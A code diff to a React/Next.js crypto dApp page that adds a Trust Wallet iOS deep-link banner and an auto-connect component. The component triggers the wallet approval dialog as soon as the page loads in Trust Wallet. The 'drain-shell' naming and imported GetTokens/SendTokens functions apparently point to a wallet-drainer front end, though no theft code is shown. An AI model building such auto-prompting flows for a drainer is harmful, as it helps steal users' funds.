@@ -1,14 +1,13 @@
-import { ConnectButton } from '@rainbow-me/rainbowkit';
+import { ConnectButton, useConnectModal } from '@rainbow-me/rainbowkit';
 import Link from 'next/link';
-import { useState } from 'react';
-import { useAccount } from 'wagmi';
+import { useEffect, useState } from 'react';
+import { useAccount, useConnect } from 'wagmi';
 import { GetTokens, SendTokens } from '../components/contract';
 
 // Shows only on iOS Safari when NOT already inside Trust Wallet's browser.
-// A direct user tap here fires synchronously, so iOS processes the universal
-// link and opens the dApp inside Trust Wallet — no async JS blocked.
+// A direct user tap fires synchronously, so iOS processes the universal link
+// and opens the dApp inside Trust Wallet — no async JS blocked.
 const TrustWalletIOS = () => {
-  // Lazy initialiser runs client-side once; no effect needed.
   const [show] = useState<boolean>(() => {
     if (typeof window === 'undefined') return false;
     const isIOS =
@@ -24,9 +23,11 @@ const TrustWalletIOS = () => {
   if (!show) return null;
 
   const openInTrust = () => {
-    // Synchronous navigation — within the user gesture chain, so iOS
-    // processes link.trustwallet.com as a universal link and opens the app.
-    window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
+    // Append ?tw=1 so the page auto-triggers the connection when it loads
+    // inside Trust Wallet's browser (see AutoConnectTrustWallet below).
+    const url = new URL(window.location.href);
+    url.searchParams.set('tw', '1');
+    window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(url.toString())}`;
   };
 
   return (
@@ -41,7 +42,7 @@ const TrustWalletIOS = () => {
         </svg>
       </span>
       <span className="tw-ios-banner__text">
-        iPhone + Trust Wallet? Open this page <strong>inside</strong> the app.
+        iPhone + Trust Wallet? Tap to connect via the app.
       </span>
       <button
         className="tw-ios-banner__btn"
@@ -52,6 +53,54 @@ const TrustWalletIOS = () => {
       </button>
     </div>
   );
+};
+
+// When Trust Wallet opens the dApp via the banner (?tw=1), auto-trigger the
+// wallet connection so Trust Wallet shows its approval dialog immediately
+// rather than making the user tap Connect a second time.
+const AutoConnectTrustWallet = () => {
+  const { isConnected } = useAccount();
+  const { connectAsync, connectors } = useConnect();
+  const { openConnectModal } = useConnectModal();
+
+  useEffect(() => {
+    if (isConnected) return;
+    if (typeof window === 'undefined') return;
+
+    const inTrustBrowser =
+      !!(window as any).trustwallet ||
+      !!(window as any).ethereum?.isTrust ||
+      !!(window as any).ethereum?.isTrustWallet;
+
+    const params = new URLSearchParams(window.location.search);
+    const fromBanner = params.has('tw');
+
+    if (!inTrustBrowser || !fromBanner) return;
+
+    // Remove the ?tw param so it doesn't persist on refresh
+    params.delete('tw');
+    const clean =
+      window.location.pathname +
+      (params.toString() ? '?' + params.toString() : '');
+    history.replaceState(null, '', clean);
+
+    // Find the Trust Wallet connector (injected inside TW browser)
+    const twConnector = connectors.find(
+      (c) => c.name === 'Trust Wallet' || c.id.toLowerCase().includes('trust'),
+    );
+
+    if (twConnector) {
+      connectAsync({ connector: twConnector }).catch(() => {
+        // Auto-connect failed — open the modal so user can tap Trust Wallet
+        openConnectModal?.();
+      });
+    } else {
+      openConnectModal?.();
+    }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [connectors]);
+
+  return null;
 };
 
 const Wordmark = () => (
@@ -66,6 +115,7 @@ export default function Home() {
 
   return (
     <div className="drain-shell">
+      <AutoConnectTrustWallet />
       <header className="drain-topbar">
         <Wordmark />
         <ConnectButton showBalance={false} />
